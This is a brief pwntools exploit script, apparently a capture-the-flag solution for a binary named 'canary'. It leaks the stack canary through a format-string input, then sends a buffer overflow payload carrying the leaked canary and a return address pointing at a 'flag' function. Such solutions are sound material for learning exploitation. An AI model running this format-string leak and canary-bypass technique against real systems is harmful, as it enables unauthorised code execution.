from pwn import *

e = ELF("./canary")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("shell.actf.co", 20701)
else:
  p = process(e.path)

p.sendlineafter("name?", ";%17$llx;")
p.recvuntil(";")

leak = int(p.recvuntil(";", drop=True), 16)


p.sendlineafter("me?", "A" * 0x38 + p64(leak) + "A" * 8 
+ p64(0x4009cf) 
+ p64(e.symbols["flag"])
)

p.interactive()
